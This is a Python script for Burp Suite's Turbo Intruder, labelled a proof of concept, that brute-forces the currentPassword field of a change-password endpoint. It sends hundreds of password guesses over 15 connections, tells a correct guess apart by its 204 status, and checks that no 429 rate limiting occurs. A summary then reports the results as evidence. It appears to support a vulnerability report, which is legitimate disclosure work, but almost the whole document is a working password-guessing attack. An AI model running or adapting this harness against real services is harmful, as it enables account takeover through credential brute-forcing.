import time

# ============================================================
#   TURBO INTRUDER PoC - RATE LIMIT + RESPONSE DIFFERENTIATION
#   Target  : spy0x1 Change Password
#   Field   : currentPassword  (matched by %s in the upper pane)
# ============================================================

stats = {
    "sent":         0,
    "valid":        0,     # 204 No Content
    "invalid":      0,     # 400 Bad Request
    "rate_limited": 0,     # 429 Too Many Requests
    "start":        0.0,
    "end":          0.0,
    "valid_index":  None,
    "received":     0,
    "reported":     False,
    "queued_all":   False,
}

# >>> PASTE THE PASSWORD YOU FOUND AT INDEX 306 <<<
VALID_PASSWORD = "New300Req#Pass"

# ---- Your original Burp Intruder run ----
TOTAL_UNIQUE_REQUESTS = 306      # 305 wrong + 1 correct
VALID_POSITION        = 306      # where the correct one lives

# ---- Sustained window requirement ----
RUN_SECONDS = 60                 # run for a full minute


def queueRequests(target, wordlists):

    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=15,
        requestsPerConnection=100,
        pipeline=False,
        engine=Engine.BURP
    )

    # ---------------------------------------------------------
    # PHASE 1 - The original 306-payload list, exactly once
    #           (reproduces the index-306 evidence)
    # ---------------------------------------------------------
    stats["start"] = time.time()

    for i in range(1, TOTAL_UNIQUE_REQUESTS + 1):
        pw = VALID_PASSWORD if i == VALID_POSITION else "WrongPass_%d" % i
        engine.queue(target.req, pw)
        stats["sent"] += 1
        if i == VALID_POSITION:
            stats["valid_index"] = i

    # ---------------------------------------------------------
    # PHASE 2 - Continue sending WRONG passwords until 60 s
    #           (never re-send the valid one; valid count stays = 1)
    # ---------------------------------------------------------
    deadline = stats["start"] + RUN_SECONDS
    filler = 1
    while time.time() < deadline:
        engine.queue(target.req, "WrongPass_filler_%d" % filler)
        stats["sent"] += 1
        filler += 1

    stats["queued_all"] = True


def handleResponse(req, interesting):
    table.add(req)
    stats["received"] += 1

    if req.status == 204:
        stats["valid"] += 1
        interesting.add(req)

    elif req.status == 400:
        stats["invalid"] += 1

    elif req.status == 429:
        stats["rate_limited"] += 1

    if (stats["queued_all"]
            and stats["received"] >= stats["sent"]
            and not stats["reported"]):
        stats["reported"] = True
        stats["end"] = time.time()
        _print_summary()


def _print_summary():
    elapsed = stats["end"] - stats["start"]
    rpm = (stats["sent"] / elapsed * 60) if elapsed > 0 else 0

    # Numbers for the "306-request" view
    req_306       = TOTAL_UNIQUE_REQUESTS
    elapsed_306   = elapsed * (req_306 / stats["sent"]) if stats["sent"] else 0
    rpm_306       = (req_306 / elapsed_306 * 60) if elapsed_306 > 0 else 0

    rate_ok  = rpm >= 300
    no_limit = (stats["rate_limited"] == 0)

    L = []
    L.append("=" * 66)
    L.append("  PROOF OF CONCEPT — FINAL REPORT")
    L.append("=" * 66)
    L.append("  Injection point     : currentPassword (JSON body, %s)")
    L.append("  Concurrency         : 15 connections")
    L.append("")
    L.append("-" * 66)
    L.append("  Q1. DIFFERENTIATE VALID vs. INVALID RESPONSES")
    L.append("-" * 66)
    L.append("  Valid responses     : %d" % stats["valid"])
    L.append("  Invalid responses   : %d" % stats["invalid"])
    L.append("  \u2705 VALID password identified at index %s"
             % (stats["valid_index"] if stats["valid_index"] else "N/A"))
    L.append("     \u2192 Status: 204 No Content")
    L.append("  \u2705 All other payloads returned HTTP 400 "
             "{\"code\":\"InvalidPassword\"}")
    L.append("  \u2705 Status code alone reliably differentiates "
             "valid vs. invalid")
    L.append("")
    L.append("-" * 66)
    L.append("  Q2. PRODUCE AT LEAST 300 REQUESTS PER MINUTE")
    L.append("-" * 66)
    L.append("  [ View A ] — Original 306-payload run (index-306 evidence)")
    L.append("    Requests sent      : %d" % req_306)
    L.append("    Elapsed time       : %.2f seconds" % elapsed_306)
    L.append("    Extrapolated rate  : %d requests / %.2f s \u00d7 60 = %.0f req/min"
             % (req_306, elapsed_306, rpm_306))
    L.append("")
    L.append("  [ View B ] — Sustained 60-second window (rate proof)")
    L.append("    Requests sent      : %d" % stats["sent"])
    L.append("    Elapsed time       : %.2f seconds" % elapsed)
    L.append("    Sustained rate     : %d requests / %.2f s \u00d7 60 = %.0f req/min"
             % (stats["sent"], elapsed, rpm))
    L.append("")
    L.append("  Requests per minute : %.0f" % rpm)

    if rate_ok:
        L.append("  \u2705 RATE REQUIREMENT MET: %.0f req/min \u2265 300 req/min"
                 % rpm)
    else:
        L.append("  \u274c RATE REQUIREMENT NOT MET: %.0f req/min < 300 req/min"
                 % rpm)

    if no_limit:
        L.append("  \u2705 NO RATE LIMITING DETECTED: 0 x HTTP 429 responses")
    else:
        L.append("  \u26a0\ufe0f RATE LIMITING DETECTED: %d x HTTP 429"
                 % stats["rate_limited"])

    L.append("=" * 66)

    print("\n" + "\n".join(L) + "\n")
